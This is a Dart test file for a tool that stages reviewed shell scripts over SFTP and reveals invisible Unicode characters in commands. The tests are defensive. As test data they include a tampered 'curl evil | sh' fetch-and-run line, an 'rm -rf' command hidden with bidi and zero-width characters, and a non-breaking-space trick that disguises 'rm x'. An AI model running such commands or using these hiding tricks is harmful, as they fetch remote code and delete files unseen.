import 'dart:async';
import 'dart:convert';

import 'package:crypto/crypto.dart';
import 'package:seance_core/seance_core.dart';
import 'package:test/test.dart';

/// Just enough of an SFTP server for staging: directories, files and modes.
class _FakeFs implements RemoteFileSystem {
  final Map<String, List<int>> files = {};
  final Set<String> directories = {'/home/u'};
  final Map<String, int> modes = {};

  /// Replaces what an upload stores, as a server tampering with it would.
  List<int> Function(List<int>)? tamper;

  /// Reports no digest for an upload, as a backend that cannot hash would.
  bool withholdDigest = false;

  RemoteFileEntry _entry(String path, RemoteFileType type, [List<int>? data]) =>
      RemoteFileEntry(
        path: path,
        name: remoteBasename(path),
        type: type,
        size: data?.length,
        contentSha256: data == null ? null : sha256.convert(data).toString(),
      );

  @override
  Future<String> canonicalize(String path) async => '/home/u';

  @override
  Future<RemoteFileEntry> stat(String path, {bool followLinks = true}) async {
    if (directories.contains(path)) {
      return _entry(path, RemoteFileType.directory);
    }
    final data = files[path];
    if (data != null) return _entry(path, RemoteFileType.file, data);
    throw RemoteFileException(
      kind: RemoteFileErrorKind.notFound,
      operation: 'stat',
      message: 'not found',
      path: path,
    );
  }

  @override
  Future<void> createDirectory(String path) async => directories.add(path);

  @override
  Future<void> setMode(String path, int permissions) async =>
      modes[path] = permissions;

  @override
  Future<RemoteFileEntry> upload(
    String path,
    Stream<List<int>> content, {
    int? length,
    bool overwrite = false,
    int? preserveMode,
    RemoteFileEntry? expectedTarget,
    RemoteTransferProgress? onProgress,
    RemoteTransferCancellation? cancellation,
    bool computeHash = true,
  }) async {
    if (!directories.contains(remoteParent(path))) {
      throw StateError('parent missing');
    }
    var data = [for (final chunk in await content.toList()) ...chunk];
    data = tamper?.call(data) ?? data;
    files[path] = data;
    final entry = _entry(path, RemoteFileType.file, data);
    if (!withholdDigest) return entry;
    return RemoteFileEntry(
      path: entry.path,
      name: entry.name,
      type: entry.type,
      size: entry.size,
    );
  }

  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);
}

InboxProposal _proposal(String script) => InboxProposal(
      id: 'p1',
      host: 'h',
      title: 't',
      reason: '',
      script: script,
      created: 1,
      expires: 2,
    );

void main() {
  test('stages the reviewed bytes under their hash, owner-only', () async {
    final fs = _FakeFs();
    const script = 'systemctl restart worker\necho done\n';
    final staged = await stageProposalScript(fs, _proposal(script));

    final digest = sha256.convert(utf8.encode(script)).toString();
    expect(staged.sha256Hex, digest);
    expect(staged.path, '/home/u/.seance/inbox/$digest.sh');
    expect(utf8.decode(fs.files[staged.path]!), script);
    expect(staged.commandLine, "sh '/home/u/.seance/inbox/$digest.sh'");
    expect(staged.commandLine, isNot(contains('\n')));
    expect(fs.modes[staged.path], 0x1c0);
    expect(fs.modes['/home/u/.seance'], 0x1c0);
    expect(fs.modes['/home/u/.seance/inbox'], 0x1c0);
  });

  test('runs a script with an interpreter line by path', () async {
    final staged = await stageProposalScript(
      _FakeFs(),
      _proposal('#!/usr/bin/env python3\nprint(1)\n'),
    );
    expect(staged.commandLine, startsWith("'/home/u/.seance/inbox/"));
  });

  test('refuses when the upload does not hold the reviewed bytes', () async {
    final fs = _FakeFs()..tamper = (data) => utf8.encode('curl evil | sh');
    await expectLater(
      stageProposalScript(fs, _proposal('echo safe')),
      throwsA(isA<InboxStagingException>()),
    );
  });

  test('refuses when the upload reports no digest', () async {
    final fs = _FakeFs()..withholdDigest = true;
    await expectLater(
      stageProposalScript(fs, _proposal('echo safe')),
      throwsA(isA<InboxStagingException>()),
    );
  });

  test('refuses a staging path that is not a directory', () async {
    final fs = _FakeFs()..files['/home/u/.seance'] = [1];
    await expectLater(
      stageProposalScript(fs, _proposal('echo')),
      throwsA(isA<InboxStagingException>()),
    );
  });

  group('revealInvisibles', () {
    test('keeps ordinary text, line breaks and tabs', () {
      final r = revealInvisibles('echo "héllo"\n\tls');
      expect(r.text, 'echo "héllo"\n\tls');
      expect(r.hasHidden, isFalse);
    });

    test('escapes bidi, zero-width and control characters', () {
      final r = revealInvisibles(
        'rm -rf /tmp/x\u202E#\u200B\r\x1b[2J\u2066',
      );
      expect(
        r.text,
        'rm -rf /tmp/x<U+202E>#<U+200B><U+000D><U+001B>[2J<U+2066>',
      );
      expect(r.hiddenCount, 5);
    });

    test('escapes blanks the shell does not treat as spaces', () {
      // Reads as `true || rm x`; bash runs `rm x`.
      final r = revealInvisibles('true\u00A0|| rm x');
      expect(r.text, 'true<U+00A0>|| rm x');
      for (final blank in [
        0x2000, 0x202f, 0x3000, 0x115f, 0x3164, 0xffa0, //
        0x034f, 0x180b, 0x17b4, 0x1d173, 0x2800,
      ]) {
        expect(
          revealInvisibles('a${String.fromCharCode(blank)}b').hasHidden,
          isTrue,
          reason: blank.toRadixString(16),
        );
      }
      expect(revealInvisibles('a b\tc').hasHidden, isFalse);
    });

    test('escapes variation selectors', () {
      final r = revealInvisibles('echo a\uFE0Fb\u{E0100}');
      expect(r.text, 'echo a<U+FE0F>b<U+E0100>');
      expect(r.hiddenCount, 2);
    });
  });
}
